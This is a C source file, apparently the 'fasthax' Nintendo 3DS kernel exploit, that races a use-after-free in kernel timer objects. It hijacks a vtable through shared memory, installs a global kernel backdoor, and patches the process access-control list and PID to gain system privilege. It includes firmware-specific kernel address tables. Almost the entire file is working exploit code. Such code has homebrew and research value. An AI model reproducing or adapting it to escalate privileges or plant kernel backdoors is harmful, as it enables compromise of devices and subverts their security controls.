/* Exploit-related code. Ned Williamson 2016 */
#include <3ds.h>
#include <stdio.h>
#include <string.h>
#include "backdoor.h"
#include "exploit.h"
#include "timer.h"
#include "util.h"
#include "cleanup.h"

extern void *handle_lookup_kern;
extern void *RandomStub;
extern u32 **svc_handler_table_writable;
extern u32 *svc_acl_check_writable;

u32 ktimer_pool_size;
u32 ktimer_base_offset;
void *ktimer_pool_head;
bool is_n3ds;

#define CURRENT_PROCESS 0xFFFF9004
#define CURRENT_KTHREAD 0xFFFF9000
#define PROCESS_ACL_OFFSET ((is_n3ds) ? 0x24 : 0x22)
#define PROCESS_PID_OFFSET ((is_n3ds) ? 0x2F : 0x2D)
#define SVC_ACL_SIZE 0x10
#define LINEAR_KERN_TO_USER(addr) ((addr) - 0xE0000000 + 0x14000000)

static u32 fptrs[16] = {
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
  (u32)&install_global_backdoor,
};

/* if the UAF succeeded, setup global_backdoor */
static bool try_setup_global_backdoor() {
  Handle timer, timer2;
  Result res;

  vu32 *timer2_next_user = (u32 *)LINEAR_KERN_TO_USER(TIMER2_NEXT_KERNEL);

  u32 orig_value = *timer2_next_user;
  /* orig_value is usually NULL. I think this is actually critical
   * for stability as it makes the next timer to alloc NULL, so other
   * procs can't interfere!
   */

  res = svcCreateTimer(&timer, RESET_PULSE);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer1\n");
    return false;
  }

  res = svcCreateTimer(&timer2, RESET_PULSE);
  if (res < 0) {
    printf("setup_global_backdoor: couldn't create timer2\n");
    svcCloseHandle(timer);
    return false;
  }

  u32 current_value = *timer2_next_user;

  /* if nothing changed, then we didn't win the race */
  if (orig_value == current_value) {
    res = svcCloseHandle(timer2);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
    }

    res = svcCloseHandle(timer);
    if (res < 0) {
      printf("setup_global_backdoor: warning: couldn't destroy timer\n");
    }

    return false;
  }

  printf("we won!\n");

  /* we won the race! replace vtable with our own */
  *timer2_next_user = (u32)&fptrs;

  /* this installs the backdoor */
  svcCancelTimer(timer2);

  /* put vtable back so we can free normally */
  /* leave timer in handle table, don't let others allocate */
  /* this is the easiest way I can think of to avoid the node getting
   * picked up by another process atm.
   */
  *timer2_next_user = current_value;
  /* reset refcount to 1 since we overwrote it */
  timer2_next_user[1] = 1;

  res = svcCloseHandle(timer2);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer2\n");
  }

  res = svcCloseHandle(timer);
  if (res < 0) {
    printf("setup_global_backdoor: warning: couldn't destroy timer\n");
  }

  return true;
}

/* returns true if attempt succeeded */
/* call this after initialize_state */
static void try_once() {
  Handle timer;
  /* each round, we allocate timer1, run the pulse timer,
   * then free it. if it frees while pulsing a UAF occurs
   * and we have &timer2 where &timer1->vtable should be.
   * so we get a vtable call where the fields from timer2
   * were controlled
   *
   * then we get (timer2+0x3c)(timer2, ...)
   * so return to any kernel function that writes an error to R0
   * 0xE....... which is R/W shared with userspace 0x2.......
   * this gives us *timer2 = userspace_addr;
   * and the timer object free list is timer1 -> timer2 -> ...
   * so we need to alloc two times to get timer2, then we should
   * be able to overwrite its vtable as we please using the shared
   * memory
   */

  svcCreateTimer(&timer, RESET_PULSE);
  // set timer with a quick first pulse, long second pulse
  // 6000 found using random trial and error. there might be
  // a better value
  svcSetTimer(timer, 8000, 0x1000000000);
  // hope the pulse race happens
  svcCloseHandle(timer);
  svcSleepThread(1000000);

  /* reallocate the freed timer and clear it from the scheduler */
  svcCreateTimer(&timer, RESET_PULSE);
  svcCancelTimer(timer);
  svcCloseHandle(timer);
}

typedef struct version_table {
  u32 kver;
  u32 handle_lookup;
  u32 random_stub;
  u32 svc_handler_table;
  u32 svc_acl_check;
  u32 ktimer_pool_head;
  u32 ktimer_pool_size;
  u32 ktimer_base_offset;
} version_table;

// New 3DS
static version_table n_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF18D5C, 0xFFF1B1A4, 0xFFF02300, 0xFFF02258, 0xFFF32238, 0x0E50, 0x4F20},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF18AFC, 0xFFF1B188, 0xFFF02310, 0xFFF02268, 0xFFF32238, 0x0E10, 0x4E20},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF18AF0, 0xFFF1B17C, 0xFFF0230C, 0xFFF02264, 0xFFF32238, 0x0E10, 0x4E20},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF18B18, 0xFFF1B1A4, 0xFFF02308, 0xFFF02260, 0xFFF32238, 0x0E10, 0x4E20},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF02268, 0xFFF32238, 0x0E10, 0x4E20},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF02268, 0xFFF32238, 0x0E10, 0x4E20},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF18AF0, 0xFFF1B17C, 0xFFF02310, 0xFFF02268, 0xFFF32238, 0x0E10, 0x4E20},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18CD4, 0xFFF1B5FC, 0xFFF0230C, 0xFFF02264, 0xFFF33278, 0x0E10, 0x4E20},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18CD4, 0xFFF1B63C, 0xFFF0230C, 0xFFF02264, 0xFFF33278, 0x0E10, 0x4E20},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18CF4, 0xFFF1B65C, 0xFFF0230C, 0xFFF02264, 0xFFF33278, 0x0E10, 0x4E20},  // 11.2
  {0},
};

// Old 3DS
static version_table o_table[] = {
  {SYSTEM_VERSION(2, 46, 0),  0xFFF184C0, 0xFFF1A830, 0xFFF02330, 0xFFF02288, 0xFFF31000, 0xdead, 0x4958},  // 9.0
  {SYSTEM_VERSION(2, 48, 3),  0xFFF185C0, 0xFFF1AB50, 0xFFF0232C, 0xFFF02284, 0xFFF31000, 0xdead, 0x4A48},  // 9.3
  {SYSTEM_VERSION(2, 49, 0),  0xFFF185B4, 0xFFF1AB44, 0xFFF02328, 0xFFF02280, 0xFFF31000, 0xdead, 0x4A48},  // 9.5
  {SYSTEM_VERSION(2, 50, 1),  0xFFF185DC, 0xFFF1AB6C, 0xFFF02324, 0xFFF0227C, 0xFFF31000, 0xdead, 0x4A48},  // 9.6
  {SYSTEM_VERSION(2, 50, 7),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF02284, 0xFFF31000, 0xdead, 0x4A48},  // 10.0
  {SYSTEM_VERSION(2, 50, 9),  0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF02284, 0xFFF31000, 0xdead, 0x4A48},  // 10.2
  {SYSTEM_VERSION(2, 50, 11), 0xFFF185A8, 0xFFF1AB38, 0xFFF0232C, 0xFFF02284, 0xFFF31000, 0xdead, 0x4A48},  // 10.4
  {SYSTEM_VERSION(2, 51, 0),  0xFFF18A80, 0xFFF1B2AC, 0xFFF02328, 0xFFF02280, 0xFFF32040, 0xdead, 0x4A48},  // 11.0
  {SYSTEM_VERSION(2, 51, 2),  0xFFF18A80, 0xFFF1B2EC, 0xFFF02328, 0xFFF02280, 0xFFF32040, 0xdead, 0x4A48},  // 11.1
  {SYSTEM_VERSION(2, 52, 0),  0xFFF18AA0, 0xFFF1B30C, 0xFFF02328, 0xFFF02280, 0xFFF32040, 0xdead, 0x4A48},  // 11.2
  {0},
};

bool initialize_handle_address() {
  u32 kver = osGetKernelVersion();
  APT_CheckNew3DS(&is_n3ds);

  version_table *table = is_n3ds ? n_table : o_table;

  while (table->kver) {
    if (table->kver == kver) {
      handle_lookup_kern = (void *)table->handle_lookup;
      RandomStub = (void *)table->random_stub;
      u32 svc_handler_table_pa = table->svc_handler_table - 0xfff00000 + 0x1ff80000;
      svc_handler_table_writable = (void *)(svc_handler_table_pa - 0x1ff00000 + 0xdff00000);
      u32 svc_acl_check_pa = table->svc_acl_check - 0xfff00000 + 0x1ff80000;
      svc_acl_check_writable = (u32 *)(svc_acl_check_pa - 0x1ff00000 + 0xdff00000);

      ktimer_pool_head = (void *)table->ktimer_pool_head;
      ktimer_pool_size = table->ktimer_pool_size;
      // temporary hack
      if (!is_n3ds) {
        ktimer_pool_size = kver <= SYSTEM_VERSION(2, 46, 0) ? 0xE50 : 0xE10;
      }
      ktimer_base_offset = table->ktimer_base_offset;
      return true;
    }
    table = table + 1;
  }
  return false;
}

static bool try_uaf(u32 attempts) {
  for (u32 i = 0; i < attempts; i++) {
    if ((i % 0x100) == 0) {
      printf("beginning attempt 0x%lx\n", i);
    }
    try_once();
    if (try_setup_global_backdoor()) {
      return true;
    }
  }
  return false;
}

static u32 kernel_patch_ret;
static s32 kernel_pid_orig;

static void kernel_patch_acl() {
  __asm__ volatile("cpsid aif");

  kernel_patch_ret = 0;

  u32 *current_process = *(u32**)(CURRENT_PROCESS);
  u32 *proc_acl = current_process + PROCESS_ACL_OFFSET;
  memset(proc_acl, 0xFF, SVC_ACL_SIZE);

  u32 **current_kthread = *(u32***)(CURRENT_KTHREAD);
  u32 *thread_acl = *(current_kthread + 0x22) - 0x6;
  memset(thread_acl, 0xFF, SVC_ACL_SIZE);

  kernel_patch_ret = 1;
}

static void kernel_patch_pid() {
  __asm__ volatile("cpsid aif");

  kernel_patch_ret = 0;

  u32 *current_process = *(u32**)(CURRENT_PROCESS);
  u32 *pid = current_process + PROCESS_PID_OFFSET;
  kernel_pid_orig = *pid;
  *pid = 0;

  kernel_patch_ret = 1;
}

static void kernel_restore_pid() {
  __asm__ volatile("cpsid aif");

  kernel_patch_ret = 0;

  u32 *current_process = *(u32**)(CURRENT_PROCESS);
  u32 *pid = current_process + PROCESS_PID_OFFSET;
  *pid = kernel_pid_orig;

  kernel_patch_ret = 1;
}

/* Copy from waithax & svchax */
bool elevate_system_privilege() {
  svcGlobalBackdoor((s32(*)(void)) & kernel_patch_acl);

  if (!kernel_patch_ret) {
    printf("elevate_system_privilege: couldn't patch SVC ACL.\n");
    return false;
  }

  svcGlobalBackdoor((s32(*)(void)) & kernel_patch_pid);

  if (!kernel_patch_ret) {
    printf("elevate_system_privilege: couldn't patch PID.\n");
    return false;
  }

  srvExit();
  srvInit();

  svcGlobalBackdoor((s32(*)(void)) & kernel_restore_pid);

  return true;
}

#define NUM_ATTEMPTS 0x10000

bool k11_exploit() {
  if (global_backdoor_installed()) {
    printf("[+] Backdoor already installed.\n");
    return true;
  }

  if (!initialize_handle_address()) {
    printf("[-] Unsupported kernel version.\n");
    return false;
  }
  printf("[+] Initialized kernel-specific offsets.\n");

  if (!initialize_timer_state()) {
    printf("[-] Couldn't initialize timer state.\n");
    return false;
  }
  printf("[+] Initialized timer state.\n");

  if (!try_uaf(NUM_ATTEMPTS)) {
    printf("[!] Couldn't trigger UAF within %x iterations.\n", NUM_ATTEMPTS);
    printf("[*] It is safe to rerun fasthax to try again.\n");
    return false;
  }

  /* XXX: we might want to cleanup ASAP if printing needs to alloc 2 timers */
  if (!global_backdoor_installed()) {
    printf("[-] UAF reported success but backdoor not installed!\n");
    return false;
  }
  printf("[+] UAF succeeded and local backdoor installed.\n");

  /* global backdoor is installed using code from this process
   * We need to restore svcBackdoor code into the kernel now so we
   * can call this SVC from any process.
   */
  if (!finalize_global_backdoor()) {
    printf("[-] Couldn't finalize global backdoor.\n");
    printf("[-] We won't be able to run kernel code in other processes.\n");
    return false;
  }

  if (!elevate_system_privilege()) {
    printf("[-] Couldn't patch ACL & service accesses.\n");
    wait_for_user();
    // if fail elevate privilege, still need cleanup
  }

  if (!cleanup_uaf()) {
    printf("[-] Warning! Exploit succeeded couldn't cleanup kernel.\n");
    printf("[-] System instability may occur.\n");
    return false;
  }

  return true;
}
